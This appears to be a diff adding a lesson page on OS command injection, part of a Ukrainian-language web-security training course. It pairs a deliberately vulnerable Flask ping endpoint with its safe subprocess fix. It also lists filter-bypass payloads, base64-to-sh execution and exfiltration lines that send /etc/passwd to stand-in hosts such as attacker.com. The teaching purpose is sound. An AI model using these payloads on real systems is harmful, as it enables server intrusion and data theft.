@@ -1,0 +1,205 @@
+<section class="module-header">
+  <h1>Модуль 14 — Command Injection</h1>
+  <p>Дізнайся, як несанітизований ввід, переданий в OS-команди, дозволяє атакуючим виконувати довільні системні команди.</p>
+</section>
+
+<section class="theory-section">
+
+  <h2>Прямий доступ до операційної системи</h2>
+  <p>
+    SQL injection дає тобі базу даних. XSS дає тобі браузер користувача. А command injection? Command injection дає тобі <strong>весь сервер</strong>. Коли додаток передає введені користувачем дані в оболонку операційної системи без належної санітизації, атакуючий може виконати будь-яку команду, яку може запускати обліковий запис веб-сервера.
+  </p>
+  <p>
+    Подумай, що це означає. Атакуючий може прочитати будь-який файл на сервері. Переглянути список процесів. Завантажити та запустити шкідливе ПЗ. Створити нові облікові записи. Переміститися на інші машини у внутрішній мережі. Встановити reverse shell і зберігати постійний доступ ще довго після того, як вразливість буде закрита.
+  </p>
+  <p>
+    Command injection — один із найсерйозніших класів вразливостей, тому що <strong>тут немає пісочниці</strong>. SQL injection обмежена тим, що може SQL. XSS обмежена тим, що може JavaScript у браузері. Command injection обмежена тим, що може операційна система — а вона може все.
+  </p>
+
+  <h2>Як працює command injection</h2>
+  <p>
+    Вразливість виникає щоразу, коли додаток бере введені користувачем дані і включає їх у рядок, який виконується як команда оболонки. Найпоширеніший сценарій — мережеві утиліти: розробники створюють веб-інтерфейс для <code>ping</code>, <code>nslookup</code>, <code>traceroute</code> чи подібних утиліт і передають ввід користувача прямо в shell.
+  </p>
+
+  <h3 class="text-red">Vulnerable Code</h3>
+  <pre><code class="language-python">@app.route('/ping')
+def ping():
+    host = request.args.get('host')
+    # DANGEROUS: user input directly in shell command
+    output = os.popen(f'ping -c 1 {host}').read()
+    return output
+
+# Normal use: host=8.8.8.8
+# Command: ping -c 1 8.8.8.8  (works fine)
+
+# Attack:   host=8.8.8.8; cat /etc/passwd
+# Command:  ping -c 1 8.8.8.8; cat /etc/passwd
+# The semicolon ends the ping command and starts a new one!</code></pre>
+
+  <p>
+    Фундаментальна проблема така сама, як і в SQL injection: оболонка отримує один рядок і не може відрізнити, де закінчується команда розробника і починається ввід користувача. Крапка з комою інтерпретується як роздільник команд, і все, що стоїть після неї, виконується як окрема команда.
+  </p>
+
+  <h2>Метасимволи shell — арсенал атакуючого</h2>
+  <p>
+    Unix shell має багато спеціальних символів, які керують виконанням команд. Кожен із них — потенційний вектор ін'єкції:
+  </p>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>Символ</th><th>Значення</th><th>Приклад</th></tr></thead>
+      <tbody>
+        <tr><td><code>;</code></td><td>Роздільник команд — виконує обидві команди</td><td><code>ping 8.8.8.8; cat /etc/passwd</code></td></tr>
+        <tr><td><code>|</code></td><td>Pipe — передає вивід першої на вхід другої</td><td><code>ping 8.8.8.8 | cat /etc/passwd</code></td></tr>
+        <tr><td><code>&&</code></td><td>AND — виконує другу тільки якщо перша успішна</td><td><code>ping 8.8.8.8 && cat /etc/passwd</code></td></tr>
+        <tr><td><code>||</code></td><td>OR — виконує другу тільки якщо перша провалилась</td><td><code>ping invalid || cat /etc/passwd</code></td></tr>
+        <tr><td><code>`cmd`</code></td><td>Підстановка через backtick — виконує вбудовано</td><td><code>ping `whoami`.attacker.com</code></td></tr>
+        <tr><td><code>$(cmd)</code></td><td>Dollar-підстановка — те саме, що backtick</td><td><code>ping $(whoami).attacker.com</code></td></tr>
+        <tr><td><code>%0a</code></td><td>URL-кодований переведення рядка — починає новий рядок</td><td><code>host=8.8.8.8%0acat+/etc/passwd</code></td></tr>
+        <tr><td><code>></code> / <code>>></code></td><td>Перенаправлення виводу у файл</td><td><code>; id > /app/static/pwned.txt</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout callout-info">
+    <strong>Windows vs. Linux:</strong> У Windows метасимволи трохи відрізняються. Використовуй <code>&</code> замість <code>;</code> як роздільник команд, а <code>|</code> працює так само. Windows-специфічні пейлоади: <code>& dir</code>, <code>| type C:\windows\win.ini</code>, <code>& whoami</code>.
+  </div>
+
+  <h3 class="text-green">Safe Code — No Shell Needed</h3>
+  <pre><code class="language-python">import subprocess
+
+@app.route('/ping')
+def ping():
+    host = request.args.get('host')
+    # SAFE: pass as a list — no shell interpretation
+    # Each element is treated as a separate argument, not parsed by the shell
+    result = subprocess.run(
+        ['ping', '-c', '1', host],
+        capture_output=True, text=True, timeout=5
+    )
+    return result.stdout</code></pre>
+
+  <p>
+    Ключова різниця: коли ти передаєш <strong>список</strong> у <code>subprocess.run()</code> без <code>shell=True</code>, аргументи передаються безпосередньо у виконуваний файл <code>ping</code>. Жодна оболонка не задіяна, тому метасимволи shell не мають жодного спеціального значення. Навіть якщо користувач надішле <code>8.8.8.8; cat /etc/passwd</code>, це буде оброблено як буквальне ім'я хоста (яке не вдасться дозволити, але <code>cat</code> не буде виконано).
+  </p>
+
+  <h2>Техніки обходу фільтрів</h2>
+  <p>
+    Багато розробників намагаються захиститися від command injection, блокуючи конкретні символи — пробіли, крапки з комою чи pipe. Ці фільтри майже завжди можна обійти. Shell — неймовірно виразна мова з десятками способів зробити одне й те саме:
+  </p>
+
+  <pre><code class="language-bash"># === SPACE BYPASS ===
+# $IFS (Internal Field Separator) — default includes space, tab, newline
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+
+# Brace expansion — commas act as separators
+{cat,/etc/passwd}
+
+# Tab character (hex 0x09)
+cat%09/etc/passwd
+
+# === KEYWORD BYPASS ===
+# Quote insertion — breaks up blocked words
+c''at /etc/passwd
+c\at /etc/passwd
+ca$()t /etc/passwd
+
+# Variable concatenation
+a=c;b=at;$a$b /etc/passwd
+
+# Base64 encoding
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+
+# Hex encoding
+$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')
+
+# Wildcard globbing
+cat /etc/pass??
+cat /etc/p*wd</code></pre>
+
+  <div class="callout callout-warning">
+    <strong>Висновок:</strong> Блокування символів shell за чорним списком — програшна стратегія. Занадто багато способів обійти будь-який фільтр. Єдиний надійний захист — <strong>взагалі не використовувати shell</strong> — передавай аргументи списком у <code>subprocess.run()</code> без <code>shell=True</code>. Якщо використання shell абсолютно необхідне, використовуй <code>shlex.quote()</code> у Python для належного екранування вводу.
+  </div>
+
+  <h2>Blind command injection</h2>
+  <p>
+    Іноді додаток виконує твою команду, але не показує вивід. Сервер може просто показати "Ping complete" або повернути загальне повідомлення про успіх. Ти не бачиш вивід команди, але все одно можеш підтвердити ін'єкцію та витягти дані через побічні канали:
+  </p>
+
+  <h3>Детекція на основі часу</h3>
+  <pre><code class="language-bash"># If the response takes 5 extra seconds, injection worked
+; sleep 5
+| sleep 5
+`sleep 5`</code></pre>
+
+  <h3>Out-of-Band (OOB) ексфільтрація даних</h3>
+  <pre><code class="language-bash"># DNS exfiltration — the data appears in your DNS logs
+; nslookup $(whoami).your-collaborator-domain.com
+; host $(cat /etc/hostname).your-server.com
+
+# HTTP exfiltration — the data arrives as a request to your server
+; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
+; wget http://attacker.com/$(whoami)</code></pre>
+
+  <h3>Ексфільтрація через запис у файл</h3>
+  <pre><code class="language-bash"># Write output to a publicly accessible file
+; cat /app/secret.txt > /app/static/output.txt
+# Then browse to http://target.com/static/output.txt</code></pre>
+
+  <div class="callout callout-success">
+    <strong>Burp Collaborator / Interactsh:</strong> У реальному пентестингу OOB-детекція стає простою завдяки таким інструментам, як Burp Collaborator (вбудований у Burp Suite Pro) або відкритий Interactsh. Ці інструменти дають тобі унікальне доменне ім'я і миттєво повідомляють, коли на нього надходить будь-який DNS або HTTP запит. Це робить виявлення blind command injection надійним і швидким.
+  </div>
+
+  <div class="callout callout-danger">
+    <strong>Вплив:</strong> Command injection дає атакуючим повний доступ на рівні ОС — вони можуть читати файли, встановлювати бекдори, створювати reverse shell, переміщуватися по внутрішніх мережах, ексфільтрувати бази даних, майнити криптовалюту або повністю знищити сервер. Ця вразливість стабільно оцінюється як Critical у програмах bug bounty.
+  </div>
+
+</section>
+
+<section class="quiz-section">
+  <h2>Knowledge Check</h2>
+  <div class="quiz-container" id="quiz">
+    <div class="quiz-question" id="q1">
+      <h3>Question 1</h3>
+      <p>Which Python function is the safest way to run external commands?</p>
+      <div class="quiz-options">
+        <button class="quiz-opt" data-q="1" data-val="a"><code>os.system(cmd)</code></button>
+        <button class="quiz-opt" data-q="1" data-val="b"><code>os.popen(cmd)</code></button>
+        <button class="quiz-opt" data-q="1" data-val="c"><code>subprocess.run(cmd, shell=True)</code></button>
+        <button class="quiz-opt" data-q="1" data-val="d"><code>subprocess.run([cmd, arg1, arg2])</code> (list, no shell)</button>
+      </div>
+      <div class="quiz-feedback" id="q1-feedback"></div>
+    </div>
+    <div class="quiz-question" id="q2">
+      <h3>Question 2</h3>
+      <p>Which characters are commonly used for command injection?</p>
+      <div class="quiz-options">
+        <button class="quiz-opt" data-q="2" data-val="a">Semicolons (<code>;</code>), pipes (<code>|</code>), backticks, and <code>$()</code></button>
+        <button class="quiz-opt" data-q="2" data-val="b">Angle brackets and ampersands only</button>
+        <button class="quiz-opt" data-q="2" data-val="c">Curly braces and square brackets only</button>
+        <button class="quiz-opt" data-q="2" data-val="d">Quote characters only</button>
+      </div>
+      <div class="quiz-feedback" id="q2-feedback"></div>
+    </div>
+    <div class="quiz-question" id="q3">
+      <h3>Question 3</h3>
+      <p>How can blind command injection be detected?</p>
+      <div class="quiz-options">
+        <button class="quiz-opt" data-q="3" data-val="a">By checking the HTTP response code</button>
+        <button class="quiz-opt" data-q="3" data-val="b">By checking if the page layout changes</button>
+        <button class="quiz-opt" data-q="3" data-val="c">Using time delays (<code>sleep</code>) or out-of-band channels (DNS/HTTP callbacks)</button>
+        <button class="quiz-opt" data-q="3" data-val="d">By reading the server's access log directly</button>
+      </div>
+      <div class="quiz-feedback" id="q3-feedback"></div>
+    </div>
+  </div>
+  <div class="quiz-result" id="quiz-result"></div>
+</section>
+
+<section class="lab-card">
+  <h2>Flask Lab — NeonPing</h2>
+  <p>Practice command injection in a network diagnostic tool with 5 challenges:</p>
+  <div class="code-block">cd labs/cmdi && docker compose up --build<br>Visit http://localhost:5011/</div>
+  <p class="text-muted">Challenges cover basic injection, blind injection, filter bypass ($(), $IFS, brace expansion), and space-restricted environments.</p>
+</section>
